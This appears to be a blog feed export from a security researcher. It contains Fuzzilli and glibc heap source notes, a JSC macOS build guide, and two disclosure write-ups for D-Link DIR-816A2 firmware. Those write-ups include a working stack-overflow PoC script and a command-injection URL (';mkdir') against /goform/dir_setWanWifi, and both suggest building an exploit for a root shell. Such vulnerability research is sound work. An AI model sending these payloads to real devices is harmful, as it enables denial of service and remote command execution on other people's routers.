class="hljs-type">Mutator</span>&gt;,<br>    <span class="hljs-params">codeGenerators</span>: <span class="hljs-type">WeightedList</span>&lt;<span class="hljs-type">CodeGenerator</span>&gt;, <span class="hljs-params">programTemplates</span>: <span class="hljs-type">WeightedList</span>&lt;<span class="hljs-type">ProgramTemplate</span>&gt;, <span class="hljs-params">evaluator</span>: <span class="hljs-type">ProgramEvaluator</span>,<br>    <span class="hljs-params">environment</span>: <span class="hljs-type">Environment</span>, <span class="hljs-params">lifter</span>: <span class="hljs-type">Lifter</span>, <span class="hljs-params">corpus</span>: <span class="hljs-type">Corpus</span>, <span class="hljs-params">minimizer</span>: <span class="hljs-type">Minimizer</span>, <span class="hljs-params">queue</span>: <span class="hljs-type">DispatchQueue</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span><br>) &#123;<br>    <span class="hljs-keyword">let</span> uniqueId <span class="hljs-operator">=</span> <span class="hljs-type">UUID</span>()<br>    <span class="hljs-keyword">self</span>.id <span class="hljs-operator">=</span> uniqueId<br>    <span class="hljs-keyword">self</span>.queue <span class="hljs-operator">=</span> queue <span class="hljs-operator">??</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">&quot;Fuzzer <span class="hljs-subst">\(uniqueId)</span>&quot;</span>, target: <span class="hljs-type">DispatchQueue</span>.global())<br><span class="hljs-operator">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>所以下面就是将每个fuzzer实例在各自的队列中通过同步执行的方式来进行启动fuzz，最后是让主线程进入事件循环状态。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">// Finally, start fuzzing.</span><br><span class="hljs-keyword">for</span> fuzzer <span class="hljs-keyword">in</span> instances &#123;<br>    fuzzer.sync &#123;<br>        fuzzer.start(runFor: numIterations)<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Start dispatching tasks on the main queue.</span><br><span class="hljs-type">RunLoop</span>.main.run()<br></code></pre></td></tr></table></figure><h4 id="关于RunLoop"><a href="#关于RunLoop" class="headerlink" title="关于RunLoop"></a>关于RunLoop</h4><p>RunLoop的主要作用：</p><p><strong>保持程序持续运行：</strong> 没有 RunLoop 的话，程序执行完 main 函数就会退出。</p><p><strong>主线程的 RunLoop：</strong> 在一个线程中，只能有一个 RunLoop 对象。main 函数中调用的 RunLoop.main.run() 就是启动了主线程的 RunLoop。</p><p><strong>进入事件循环：</strong> 一旦调用了 run() 方法，线程就会进入一个事件循环，不断地监听和处理事件，直到程序退出。</p><p>RunLoop的本质：</p><p><strong>RunLoop 本质上是一个对象</strong>，它负责管理线程上的事件。</p><p>当一个线程被创建时，系统会自动为其创建一个 RunLoop 对象。我们可以通过 <code>RunLoop.current</code> 或 <code>RunLoop.main</code> 这样的方式来获取当前线程或主线程的 RunLoop 对象，这背后其实是一个隐式的创建和获取过程。</p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzzilli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IoT--StackOverflow</title>
    <link href="/2024/03/07/IoT-StackOverflow/"/>
    <url>/2024/03/07/IoT-StackOverflow/</url>
    
    <content type="html"><![CDATA[<h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Dlink DIR-816A2_FWv1.10CNB05.</p><h1 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h1><p>Dlink DIR-816A2_FWv1.10CNB05 was discovered to contain a stack overflow via parameter wizardstep4_ssid_5.</p><h1 id="Firmware-download-address"><a href="#Firmware-download-address" class="headerlink" title="Firmware download address"></a>Firmware download address</h1><p>Manufacturer’s address: <a href="https://www.dlink.com/">https://www.dlink.com/</a></p><p>Firmware download address: <a href="http://www.dlink.com.cn/techsupport/AllPro.aspx">D-Link Technical Support (dlink.com.cn)</a></p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211202652.png"></p><h1 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h1><p>From the following, we can see that there are two places where our input parameters wizardstep4_ssid_2 and wizardstep4_ssid_5 are written into v25 respectively, and there is no length limit. Every time we write our parameters to v25, we perform a doSystem operation, which allows for command injection through both parameters, as we mentioned in the previous article.</p><p>Here we focus on v19 and v20, which are respectively written into v25 without length restrictions, which can cause stack overflow. Due to repeated writes into a buffer, we have decided to cause overflow when v20 is written into v25.</p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211213600.png"></p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211225412.png"></p><h1 id="Recurring-vulnerabilities-and-POC"><a href="#Recurring-vulnerabilities-and-POC" class="headerlink" title="Recurring vulnerabilities and POC"></a>Recurring vulnerabilities and POC</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://192.168.1.25/goform/dir_setWanWifi&quot;</span><br><br>data = &#123;<br>    <span class="hljs-string">&#x27;connecttype&#x27;</span>:<span class="hljs-string">&#x27;DHCP&#x27;</span>,<br>    <span class="hljs-string">&#x27;statuscheckpppoeuser&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;wizardstep4_ssid_2&#x27;</span>:<span class="hljs-string">&#x27;123456&#x27;</span>,<br>    <span class="hljs-string">&#x27;wizardstep4_ssid_5&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1000</span><br>&#125;<br><br>response = requests.post(url,data=data)<br></code></pre></td></tr></table></figure><p>The following is the result in gdb after sending POC:</p><p>Firstly, execute sprintf to write parameter wizardstep4_ssid_5 to v25, corresponding to the circled part in IDA:</p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211240631.png"></p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211253417.png"></p><p>The result returned by sprintf is 0x3fe, indicating that our parameters were successfully written into v25.</p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211307047.png"></p><p>Continuing with the following execution until the function reaches its end, it can be observed that the return address has been overwritten as’ aaaa ‘.</p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211319088.png"></p><p>Continuing to run will cause the program to crash.</p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211331537.png"></p><p>Entering again will result in no response.</p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211340336.png"></p><p>And you can write your own exp(ROP gadget) to get the root shell.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IoT--CommandExecution</title>
    <link href="/2024/03/06/IoT-CommandExecution/"/>
    <url>/2024/03/06/IoT-CommandExecution/</url>
    
    <content type="html"><![CDATA[<h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Dlink DIR-816A2_FWv1.10CNB05.</p><h1 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h1><p>Dlink DIR-816A2_FWv1.10CNB05 was discovered to contain a command injection via parameter wizardstep4_ssid_2.</p><h1 id="Firmware-download-address"><a href="#Firmware-download-address" class="headerlink" title="Firmware download address"></a>Firmware download address</h1><p>Manufacturer’s address: <a href="https://www.dlink.com/">https://www.dlink.com/</a></p><p>Firmware download address: <a href="http://www.dlink.com.cn/techsupport/AllPro.aspx">D-Link Technical Support (dlink.com.cn)</a></p><p><img src="/2024/03/06/IoT-CommandExecution/image-20240906210959390.png"></p><h1 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h1><p>Dlink DIR-816A2_FWv1.10CNB05 is affected by a remote command injection vulnerability.  We can construct a parameter wizardstep4_ssid_2 that includes command execution, and when we request &#x2F;goform&#x2F;dir_setWanWifi, it will be sub_ 42DA54 function processing, ultimately leading to command execution.</p><p>We can perform command injection through parameter wizardstep4_ssid_2. The same effect can also be achieved through parameter wizardstep4_ssid_5:</p><p>Obtain parameters wizardstep4_ssid_2 to v19, ultimately write them into v25, and then execute them in doSystem.</p><p><img src="/2024/03/06/IoT-CommandExecution/image-20240906211010678.png"></p><h1 id="Recurring-vulnerabilities-and-POC"><a href="#Recurring-vulnerabilities-and-POC" class="headerlink" title="Recurring vulnerabilities and POC"></a>Recurring vulnerabilities and POC</h1><p>We can directly enter in the address bar:</p><pre><code class="hljs">http://192.168.1.25/goform/dir_setWanWifi?connecttype=DHCP&amp;statuscheckpppoeuser=0&amp;wizardstep4_ssid_2=123456;mkdir dingjiayu</code></pre><p><img src="/2024/03/06/IoT-CommandExecution/image-20240906211041679.png"></p><p>The following is the parameter status before entering the doSystem function in gdb:</p><p><img src="/2024/03/06/IoT-CommandExecution/image-20240906211054699.png"></p><p>When entering doSystem, check the parameters passed in through register A0:</p><p><img src="/2024/03/06/IoT-CommandExecution/image-20240906211104610.png"></p><p>Now we continue to execute and find that the command has been executed, creating the dingjiayu folder:</p><p><img src="/2024/03/06/IoT-CommandExecution/image-20240906211114175.png"></p><p>And you can write your own exp to get the root shell.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MacOS下JSC编译方式的更改</title>
    <link href="/2024/01/28/MacOS%E4%B8%8BJSC%E7%BC%96%E8%AF%91%E6%96%B9%E5%BC%8F%E7%9A%84%E6%9B%B4%E6%94%B9/"/>
    <url>/2024/01/28/MacOS%E4%B8%8BJSC%E7%BC%96%E8%AF%91%E6%96%B9%E5%BC%8F%E7%9A%84%E6%9B%B4%E6%94%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>从论文的Fuzz说起，由于要做WebKit相关的论文工作，fuzzilli是一款很好的Fuzzer，但是fuzzilli针对JSC的fuzz过程是在Linux下进行的。下面探索在MacOS平台上，用fuzzilli对JSC进行fuzz的相关工作。</p><p>从WebKit的角度来讲，它只不过是一个很大的应用程序而已，所以它在Linux和MacOS均可编译，但是在不同的平台，编译的方式有点差别，这里我们做的工作主要针对JS引擎。</p><table><thead><tr><th>平台</th><th>编译难度</th><th>JSC的形式</th><th>配置方式</th></tr></thead><tbody><tr><td>Linux</td><td>相对较易</td><td>默认是编译处理静态库</td><td></td></tr><tr><td>MacOS</td><td>相对较难</td><td>默认编译处理是动态库</td><td>Xcode配置文件</td></tr></tbody></table><p>最初通过默认方式分别在两个平台编译JSC，对比发现Fuzzer跑的效果不一样，在MacOS平台上获取Edge的数量要远远小于Linux下的，最后归因于JSC的动态库和静态库差别导致的。</p><p>JSC编译成动态库的形式，Fuzzer是获取不到其中的Edge，因为最终是编译为jsc程序，动态库并没有将相关代码插入到jsc中，静态库却将代码插入进去，获取Edge相关代码也是插入到jsc程序中的，所以才会有所不同。</p><p>最后是决定在MacOS下将JSC编译为静态库的形式【转换成静态库的形式是正常的】。下面主要是围绕如何将JSC以原有的动态库项目转换成静态库。</p><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p>下面修改文件的方式包含了两种，一种是从文本的形式去更改配置文件，另一种是通过Xcode去修改配置文件。</p><h3 id="文本形式"><a href="#文本形式" class="headerlink" title="文本形式"></a>文本形式</h3><p>下面做的更改主要是将JSC由动态库的形式更改为静态库。</p><p>在JavaScriptCore项目配置文件中，打开project.pbxproj文件：</p><ul><li><p>将JavaScriptCore的productType由com.apple.product-type.framework更改为com.apple.product-type.library.static</p></li><li><p>将该文件中的JavaScriptCore.framework更改为libJavaScriptCore.a</p></li></ul><p>下图为以文件夹的形式打开JSC项目配置文件，然后找到project.pbxproj文件，接着以文本的形式打开。上面修改的位置是针对整个文件，所有地方都要修改。</p><p><img src="/2024/01/28/MacOS%E4%B8%8BJSC%E7%BC%96%E8%AF%91%E6%96%B9%E5%BC%8F%E7%9A%84%E6%9B%B4%E6%94%B9/image-20240828145129622.png"></p><h3 id="Xcode形式"><a href="#Xcode形式" class="headerlink" title="Xcode形式"></a>Xcode形式</h3><h4 id="更改为静态库"><a href="#更改为静态库" class="headerlink" title="更改为静态库"></a>更改为静态库</h4><p>对于Target中JavaScriptCode，需要将其编译的产物更改为静态库：</p><p>Build Settings找到Mach-O Type将Dynamic Library更改为Static Library</p><h4 id="更改依赖"><a href="#更改依赖" class="headerlink" title="更改依赖"></a>更改依赖</h4><p>修改完上面的内容后，JavaScriptCore已经由动态链接库的形式转换为静态库的形式，但是在Xcode中很多Target还是依赖JavaScriptCore.framework的，下面就需要手动将其更改为libJavaScriptCore.a的形式。由于编译jsc需要依赖其他Target，为了让这些Target能够编译成功，需要手动将所有相关Target都进行一个依赖调整。</p><p>比如下面是将minidom依赖的JavaScriptCore由JavaScriptCore.framework更改为libJavaScriptCore.a：</p><p>①、在Build Phases—&gt;Link Binary With Libraries中进行添加。</p><p><img src="/2024/01/28/MacOS%E4%B8%8BJSC%E7%BC%96%E8%AF%91%E6%96%B9%E5%BC%8F%E7%9A%84%E6%9B%B4%E6%94%B9/image-20240828145432720.png"></p><p>下面是为了解决①遗留问题，如果通过①更改完成后，编译还是报相关错误，可以通过②在命令行参数中手动添加：</p><p>②、如果①设置了仍然报相关错误，就可以在命令行参数添加。在Build Settings—&gt;Linking-General—&gt;Other Linker Flags中添加对应的参数，参数的格式为-l库名</p><p><img src="/2024/01/28/MacOS%E4%B8%8BJSC%E7%BC%96%E8%AF%91%E6%96%B9%E5%BC%8F%E7%9A%84%E6%9B%B4%E6%94%B9/image-20240828145730017.png"></p><h4 id="其他调整"><a href="#其他调整" class="headerlink" title="其他调整"></a>其他调整</h4><p>下面主要解决编译过程中的一些小错误，比如没用到的函数会触发编译错误，还有就是相关警告也被当成编译错误。</p><h5 id="unused-function"><a href="#unused-function" class="headerlink" title="unused function"></a>unused function</h5><p>关于unused系列，找到对应Target，可以设置是否发出对应的警告</p><p><img src="/2024/01/28/MacOS%E4%B8%8BJSC%E7%BC%96%E8%AF%91%E6%96%B9%E5%BC%8F%E7%9A%84%E6%9B%B4%E6%94%B9/image-20240828151531690.png"></p><h5 id="Treat-Warnings-as-Errors"><a href="#Treat-Warnings-as-Errors" class="headerlink" title="Treat Warnings as Errors"></a>Treat Warnings as Errors</h5><p>让警告不要当成错误处理：Treat Warnings as Errors由Yes更改为No</p><p><img src="/2024/01/28/MacOS%E4%B8%8BJSC%E7%BC%96%E8%AF%91%E6%96%B9%E5%BC%8F%E7%9A%84%E6%9B%B4%E6%94%B9/image-20240828151637693.png"></p><blockquote><p><a href="https://stackoverflow.com/questions/1349115/how-do-i-change-an-existing-xcode-target-from-dynamic-to-static">https://stackoverflow.com/questions/1349115/how-do-i-change-an-existing-xcode-target-from-dynamic-to-static</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>MacOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JSC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tcache源码分析</title>
    <link href="/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="关于tcache"><a href="#关于tcache" class="headerlink" title="关于tcache"></a>关于tcache</h1><p>自glibc2.26起，加入了tcache机制，可以参考：</p><blockquote><p>在线看源码：<a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c">malloc.c - malloc&#x2F;malloc.c - Glibc source code (glibc-2.27) - Bootlin</a></p><p>CTFWIKI：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/">Tcache attack - CTF Wiki (ctf-wiki.org)</a></p></blockquote><h2 id="相关宏定义"><a href="#相关宏定义" class="headerlink" title="相关宏定义"></a>相关宏定义</h2><p>下面是以size_t &#x3D; 4为例</p><ul><li>request2size：是根据用户提供的size计算对应的chunk大小</li></ul><p>比如用户提供20，计算的chunk大小是24，减去8字节头部，还剩16字节，然后剩下4字节是下一个chunk的pre_size字段</p><ul><li>tidx2usize，这个是根据tidx计算对应的用户能使用的大小</li></ul><p>比如idx 0，计算得到12 &#x3D;&gt;用户能使用12&#x3D;&gt;对应的chunk大小为16&#x3D;&gt;8（头部）+8（user）+4（pre_size）&#x3D;&gt;用户能使用12字节大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><span class="hljs-comment">//tcache_bin的数目</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS        64</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)</span><br><span class="hljs-comment">//根据idx计算对应的用户可用的最大size</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><span class="hljs-comment">//下面的x是chunk的size，根据chunk的size计算对应的idx</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">//下面的x是user的size，根据用户的size计算对应的idx</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><span class="hljs-comment">//每一个tcache_bin能容纳的chunk数</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_FILL_COUNT 7</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//将用户所需的size转为chunk的size</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req)                                         \  </span><br>    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \<br>   MINSIZE :                                                      \<br>    ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)<br></code></pre></td></tr></table></figure><h2 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h2><p>下面是单链表结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure><p>下面是线程独有的tcache结构体，__thread关键字是为了线程局部存储TLS</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><span class="hljs-type">static</span> __thread <span class="hljs-type">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br><span class="hljs-type">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>下面这个函数是将一个chunk放进对应的tcache bin单链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这个是从对应tcache bin的单链表中取出一个chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="相关应用"><a href="#相关应用" class="headerlink" title="相关应用"></a>相关应用</h2><p>这部分主要看下tcache被应用在哪里，分析一下增加了哪些操作步骤。这里只是截取添加的部分，原有的部分请参考malloc和free的代码分析</p><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><p>这里有个tcache_unsorted_count后面是为了统计已处理的unsorted chunk</p><p><img src="/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826224035744.png"></p><p>下面是处理fast chunk，先获取一个victim，剩余其他的放进tcache中（前提是对应的tcache bin没有放满）</p><p><img src="/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826224040807.png"></p><p>下面是small chunk，和fast chunk流程一样</p><p><img src="/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826224313049.png"></p><p>下面是定义了一些变量，准备for循环处理unsorted bin时</p><p><img src="/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826224328563.png"></p><p>在for循环处理unsorted chunk时，大小符合，是先将chunk放进tcache中，将return_cached设为1</p><p><img src="/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826224340850.png"></p><p>这里是非size &#x3D;&#x3D;nb的情况，将unsorted chunk放进对应的bin中，然后将unsorted_count+1，如果有设置tcache_unsorted_limit，达到条件就可以直接调用tcache_get，否则是处理完unsorted bin中的chunk，最后调用tcache_get</p><p><img src="/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826224353143.png"></p><h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h3><p>在free一块内存时，首先看看是否能够放进tcache中，在tcache bin没有放满的情况下，是先将释放的chunk存到tcache中，将tcache放满后才会像正常的free流程那样</p><p><img src="/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826224855682.png"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>free源码分析</title>
    <link href="/2023/11/27/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2023/11/27/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="free源码分析"><a href="#free源码分析" class="headerlink" title="free源码分析"></a>free源码分析</h1><h2 id="关于别名"><a href="#关于别名" class="headerlink" title="关于别名"></a>关于别名</h2><p>这里提一下，我们在编程中使用malloc或者free时，glibc中往往是对应的libc_malloc&#x2F;free，下面可以看到在glibc中是通过别名的方式来实现这种映射关系</p><p><img src="/2023/11/27/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826165746269.png"></p><h2 id="libc-free"><a href="#libc-free" class="headerlink" title="libc_free"></a>libc_free</h2><p>大致流程如下：</p><p>1、检查一下是否有hook</p><p>2、关于mmaped memory，释放单独处理</p><p>3、获取ar，arena_for_chunk (p)如果是main_arena就直接返回arena，非主分配区就直接用heap_for_ptr计算，在heap的开头部分</p><p>4、调用int_free函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span><br>__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)                              <span class="hljs-comment">/* free(0) has no effect */</span><br>    <span class="hljs-keyword">return</span>;<br><br>  p = mem2chunk (mem);<br><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold<br>          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      munmap_chunk (p);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><h3 id="安全检查"><a href="#安全检查" class="headerlink" title="安全检查"></a>安全检查</h3><p>1、地址范围是否合法，地址是否对齐</p><p>2、大小是否合法，大小是否对齐</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 